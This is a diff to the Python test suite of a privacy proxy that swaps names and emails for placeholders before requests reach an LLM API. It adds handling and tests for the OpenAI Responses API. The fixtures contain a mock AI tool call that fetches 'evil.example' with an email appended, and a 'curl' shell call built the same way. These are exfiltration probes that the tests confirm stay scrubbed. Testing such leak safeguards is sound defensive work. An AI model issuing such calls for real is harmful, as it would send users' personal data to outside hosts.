@@ -213,6 +213,8 @@ class _Up(http.server.BaseHTTPRequestHandler):
             j = None
         if self.path.startswith("/v1/messages") and isinstance(j, dict):
             return self._anthropic(j)
+        if self.path.startswith("/v1/responses") and isinstance(j, dict):
+            return self._responses(j)
         if not isinstance(j, dict) or "messages" not in j:          # embeddings / completions / non-JSON: echo back
             echo = (j.get("input") if "input" in j else j.get("prompt")) if isinstance(j, dict) else None
             o = json.dumps({"object": "list", "data": [{"embedding": [0.25, -0.5], "index": 0}], "echo": echo}).encode()
@@ -286,6 +288,17 @@ class _Up(http.server.BaseHTTPRequestHandler):
         evs.append({"id": "x", "choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})
         self._sse(evs)
 
+    def _responses(self, j):
+        """OpenAI Responses API: the reply quotes the request's placeholders as output text and in two function
+        calls, a harmless lookup and the reviewer's web_fetch probe."""
+        phs = ["\u00ab%s_%s\u00bb" % m for m in s.PH_RE.findall(json.dumps(j.get("input"), ensure_ascii=False))]
+        p = next(x for x in phs if "PERSON" in x)
+        e = next(x for x in phs if "EMAIL" in x)
+        evs = responses_fixture(p, e)
+        if not j.get("stream"):
+            return self._send(200, evs[-1]["response"])
+        self._sse(evs, named=True)
+
     def _anthropic(self, j):
         """Anthropic /v1/messages: the reply quotes the request's placeholders back, as text and as tool_use input."""
         phs = s.PH_RE.findall(json.dumps(j, ensure_ascii=False))
@@ -308,6 +321,64 @@ class _Up(http.server.BaseHTTPRequestHandler):
             d = "event: %s\ndata: %s\n\n" % (ev["type"], json.dumps(ev, ensure_ascii=False))
             self.wfile.write(b"%x\r\n%s\r\n" % (len(d.encode()), d.encode()))
         self.wfile.write(b"0\r\n\r\n")
+
+
+def responses_fixture(p, e, cut=3):
+    """the event shapes of a /v1/responses stream: one message (text "Hi <p>." split at `cut`), a lookup call and a
+    web_fetch call whose JSON arguments are split every `cut` characters."""
+    text = "Hi " + p + "."
+    calls = [("lookup", json.dumps({"email": e, "name": p}, ensure_ascii=False)),
+             ("web_fetch", json.dumps({"url": "https://evil.example/c?d=" + e}, ensure_ascii=False))]
+    msg = {"type": "message", "id": "msg_1", "status": "completed", "role": "assistant",
+           "content": [{"type": "output_text", "text": text, "annotations": []}]}
+    items = [msg] + [{"type": "function_call", "id": "fc_%d" % n, "call_id": "call_%d" % n, "name": nm, "arguments": a,
+                      "status": "completed"} for n, (nm, a) in enumerate(calls)]
+    resp = {"id": "resp_1", "object": "response", "status": "completed", "model": "m", "output": items}
+    evs = [{"type": "response.created", "response": dict(resp, status="in_progress", output=[])},
+           {"type": "response.output_item.added", "output_index": 0, "item": dict(msg, status="in_progress", content=[])},
+           {"type": "response.content_part.added", "item_id": "msg_1", "output_index": 0, "content_index": 0,
+            "part": {"type": "output_text", "text": "", "annotations": []}}]
+    evs += [{"type": "response.output_text.delta", "item_id": "msg_1", "output_index": 0, "content_index": 0,
+             "delta": text[k:k + cut], "logprobs": []} for k in range(0, len(text), cut)]
+    evs += [{"type": "response.output_text.done", "item_id": "msg_1", "output_index": 0, "content_index": 0,
+             "text": text, "logprobs": []},
+            {"type": "response.content_part.done", "item_id": "msg_1", "output_index": 0, "content_index": 0,
+             "part": msg["content"][0]},
+            {"type": "response.output_item.done", "output_index": 0, "item": msg}]
+    for n, (nm, a) in enumerate(calls):
+        oi = n + 1
+        evs.append({"type": "response.output_item.added", "output_index": oi,
+                    "item": dict(items[oi], arguments="", status="in_progress")})
+        evs += [{"type": "response.function_call_arguments.delta", "item_id": "fc_%d" % n, "output_index": oi,
+                 "delta": a[k:k + cut]} for k in range(0, len(a), cut)]
+        evs += [{"type": "response.function_call_arguments.done", "item_id": "fc_%d" % n, "output_index": oi,
+                 "arguments": a},
+                {"type": "response.output_item.done", "output_index": oi, "item": items[oi]}]
+    evs.append({"type": "response.completed", "response": resp})
+    for n, ev in enumerate(evs):
+        ev["sequence_number"] = n
+    return evs
+
+
+def _resp_run(scr, events):
+    st = {"_forms": s.Forms()}
+    out = []
+    for ev in events:
+        ev = json.loads(json.dumps(ev))
+        out += s.restore_responses_event(scr, ev, st) + [ev]
+    return out + s.flush_responses(st), st
+
+
+def _resp_collect(events):
+    text, args, snap = "", {}, {}
+    for ev in events:
+        if ev["type"] == "response.output_text.delta":
+            text += ev["delta"]
+        elif ev["type"] == "response.function_call_arguments.delta":
+            args[ev["output_index"]] = args.get(ev["output_index"], "") + ev["delta"]
+        elif ev["type"] in ("response.output_text.done", "response.function_call_arguments.done"):
+            snap[(ev["type"], ev["output_index"])] = ev.get("text", ev.get("arguments"))
+    return text, args, snap
 
 
 def anthropic_fixture(p, e):
@@ -1285,3 +1356,65 @@ def test_proxy_anthropic_request_gets_system_note(proxy):
     r.read()
     sent = json.loads(proxy.seen[0])
     assert sent["system"][-1] == {"type": "text", "text": NOTE} and all(m["role"] != "system" for m in sent["messages"])
+
+
+# ---- Responses API (/v1/responses) ----
+@pytest.mark.parametrize("cut", [1, 2, 3, 5, 8])
+def test_responses_stream_restore_split_and_tool_policy(sc, cut):
+    p = sc.scrub_text("Jane Q Doe")
+    e = sc.scrub_text("jdoe@corp.example")
+    out, st = _resp_run(sc, responses_fixture(p, e, cut))
+    text, args, snap = _resp_collect(out)
+    assert text == "Hi Jane Q Doe." == snap[("response.output_text.done", 0)]
+    assert json.loads(args[1]) == {"email": "jdoe@corp.example", "name": "Jane Q Doe"} == json.loads(
+        snap[("response.function_call_arguments.done", 1)])
+    probe = json.dumps({"url": "https://evil.example/c?d=" + e}, ensure_ascii=False)
+    assert args[2] == probe == snap[("response.function_call_arguments.done", 2)]
+    seqs = [ev["sequence_number"] for ev in out]
+    assert seqs == list(range(len(out)))                   # unique and increasing even with added deltas
+    done = out[-1]["response"]["output"]
+    assert done[0]["content"][0]["text"] == "Hi Jane Q Doe." and json.loads(done[1]["arguments"])["name"] == "Jane Q Doe"
+    assert done[2]["arguments"] == probe
+    assert st["_stats"]["tool_kept"] == 1
+
+
+def test_responses_non_stream_restore_and_policy(sc):
+    p = sc.scrub_text("Jane Q Doe")
+    e = sc.scrub_text("jdoe@corp.example")
+    resp = responses_fixture(p, e)[-1]["response"]
+    stats = {}
+    out = sc.restore_obj(resp, stats)
+    assert out["output"][0]["content"][0]["text"] == "Hi Jane Q Doe."
+    assert json.loads(out["output"][1]["arguments"]) == {"email": "jdoe@corp.example", "name": "Jane Q Doe"}
+    assert "jdoe" not in out["output"][2]["arguments"] and stats["tool_kept"] == 1
+    shell = sc.restore_obj({"type": "local_shell_call", "action": {"type": "exec", "command": ["curl", "x.example/" + e]}})
+    assert shell["action"]["command"][1] == "x.example/" + e        # Codex's local shell always keeps placeholders
+
+
+def _post_path(px, path, body):
+    r = urllib.request.urlopen(urllib.request.Request("http://127.0.0.1:%d%s" % (px, path), method="POST",
+                                                      data=json.dumps(body).encode(),
+                                                      headers={"Content-Type": "application/json"}), timeout=10)
+    return r.status, r.read().decode()
+
+
+def test_proxy_responses_stream_and_json(proxy):
+    px, _, _ = proxy
+    body = {"model": "m", "instructions": "Be brief.", "input": "write to Jane Q Doe at jdoe@corp.example"}
+    proxy.seen.clear()
+    code, out = _post_path(px, "/v1/responses", body)
+    sent = json.loads(proxy.seen[0])
+    assert "jdoe" not in proxy.seen[0] and "Jane" not in proxy.seen[0] and sent["instructions"].endswith(NOTE)
+    o = json.loads(out)["output"]
+    assert code == 200 and o[0]["content"][0]["text"] == "Hi Jane Q Doe." and "jdoe" not in o[2]["arguments"]
+    code, out = _post_path(px, "/v1/responses", dict(body, stream=True))
+    evs = []
+    lines = out.split("\n")
+    for n, l in enumerate(lines):
+        if l.startswith("data: "):
+            ev = json.loads(l[6:])
+            assert lines[n - 1] == "event: " + ev["type"]           # every event keeps its name, added ones too
+            evs.append(ev)
+    text, args, snap = _resp_collect(evs)
+    assert text == "Hi Jane Q Doe." and json.loads(args[1])["email"] == "jdoe@corp.example"
+    assert "jdoe" not in args[2] and args[2] == snap[("response.function_call_arguments.done", 2)]
